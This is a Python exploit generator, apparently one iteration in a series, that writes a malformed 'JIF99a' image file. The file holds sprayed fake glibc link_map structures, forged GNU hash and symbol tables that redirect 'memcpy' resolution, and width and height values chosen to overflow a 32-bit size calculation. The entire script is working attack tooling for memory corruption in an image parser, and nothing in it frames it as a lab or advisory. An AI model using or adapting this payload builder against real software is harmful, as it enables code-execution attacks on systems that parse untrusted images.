#!/usr/bin/env python3
"""W361: phase-indexed fake link_map hybrid on the larger wrapped geometry.

Differences from W360: LEN/HEIGHT and the expected avail_out are parameters,
so the 49-map encoding fits under data_size*255 = 6120 bytes.  All other
mechanics (W353 full 0x40 filler, W358 coherent per-phase map, array sweep)
are unchanged.  No target memory or register is written by this generator.
"""
import hashlib
import struct
import sys
import zlib

out = sys.argv[1]
noise = int(sys.argv[2], 0) if len(sys.argv) > 2 else 0
K = int(sys.argv[3], 0) if len(sys.argv) > 3 else 0x30
spacing = int(sys.argv[4], 0) if len(sys.argv) > 4 else 0x600
idx_nom = int(sys.argv[5], 16) if len(sys.argv) > 5 else 0x555555678f00
delta = int(sys.argv[6], 0) if len(sys.argv) > 6 else 0x47210
M = int(sys.argv[7], 16) if len(sys.argv) > 7 else 0x5555556a0200
arr_lo = int(sys.argv[8], 0) if len(sys.argv) > 8 else delta - 0x800
arr_hi = int(sys.argv[9], 0) if len(sys.argv) > 9 else delta + 0x800
LEN = int(sys.argv[10], 0) if len(sys.argv) > 10 else 38020
HEIGHT = int(sys.argv[11], 0) if len(sys.argv) > 11 else 56483
plain_len = int(sys.argv[12], 0) if len(sys.argv) > 12 else 0xc0000
base = M - idx_nom
hash_ = 0x0d827590                       # new_hash("memcpy")
plain = bytearray([0x40]) * plain_len

if noise:
    s = 0x2545f4914f6cdd1d
    for j in range(0x3e000, 0x3e000 + noise):
        s = (s * 6364136223846793005 + 1442695040888963407) & ((1 << 64) - 1)
        plain[j] = (s >> 33) & 0xff


def put(off, raw):
    if off < 0 or off + len(raw) > len(plain):
        raise ValueError(hex(off))
    plain[off:off + len(raw)] = raw


def q(v):
    return struct.pack("<Q", v & 0xffffffffffffffff)


def w(v):
    return struct.pack("<I", v & 0xffffffff)


for k in range(K + 1):
    mk = M + spacing * k
    sh = 16 * k
    fb = base + spacing * k - sh

    def f(fo, raw):
        put(fb + fo, raw)

    f(0x000, q(0))                        # l_addr
    f(0x028, q(mk))                       # l_real
    f(0x068, q(mk + 0x4d0))               # l_info[DT_STRTAB]
    f(0x070, q(mk + 0x4e0))               # l_info[DT_SYMTAB]
    f(0x32c, w(1))                        # l_nbuckets
    f(0x330, w(0))                        # l_gnu_bitmask_idxbits
    f(0x334, w(0))                        # l_gnu_shift
    f(0x338, q(mk + 0x4a0))               # l_gnu_bitmask
    f(0x340, q(mk + 0x4b0))               # l_gnu_buckets
    f(0x348, q(mk + 0x4c0))               # l_gnu_chain_zero
    f(0x354, w(0))                        # l_type, l_removed
    f(0x380, q(0))                        # l_versyms
    f(0x414, w(0))                        # l_used store target
    f(0x4a0, q(1 << 16))                  # GNU bitmask word
    f(0x4b0, w(1))                        # bucket[0]
    f(0x4c0, w(hash_ | 1))                # chain[1] matches new_hash
    f(0x4d0, q(5))                        # Dyn DT_STRTAB
    f(0x4d8, q(mk + 0x500))
    f(0x4e0, q(6))                        # Dyn DT_SYMTAB
    f(0x4e8, q(mk + 0x520))
    f(0x500, b"\x00memcpy\x00")           # strtab
    sym = struct.pack("<IBBHQQ", 1, 0x12, 0, 1, mk + 0x600, 8)
    f(0x538, sym[0:8])
    f(0x540, sym[8:16])
    f(0x548, sym[16:24])
    # For live idx = idx_nom + 16*k this cell lands at M+0x28 and selects mk.
    put(base + 0x28 - sh, q(mk))

for off in range(arr_lo, arr_hi, 8):
    put(off, q(M))

z = zlib.compress(bytes(plain), 9)
chunks = b"".join(bytes([len(z[i:i + 255])]) + z[i:i + 255]
                  for i in range(0, len(z), 255)) + b"\x00"
gce = b"\x21\xf9\x04\x01\x00\x00\x00\x00"
jif = (b"JIF99a" + struct.pack("<HHBBB", LEN, HEIGHT, 0, 0, 0) + gce
       + b"\x2c" + struct.pack("<HHHHB", 0, 0, LEN, HEIGHT, 0) + b"\x08"
       + chunks + b"\x3b")
with open(out, "wb") as fd:
    fd.write(jif)
prod = LEN * HEIGHT
dsize = (prod * 2) & 0xffffffff
print("WROTE %s M=%#x idx_nom=%#x base=%#x K=%#x spacing=%#x delta=%#x "
      "arr=%#x..%#x geo=%dx%d avail=%#x data_size=%#x cap=%d plain=%#x "
      "plain_sha256=%s zlen=%d file=%d" %
      (out, M, idx_nom, base, K, spacing, delta, arr_lo, arr_hi,
       LEN, HEIGHT, prod & 0xffffffff, dsize, dsize * 255, plain_len,
       hashlib.sha256(plain).hexdigest(), len(z), len(jif)))
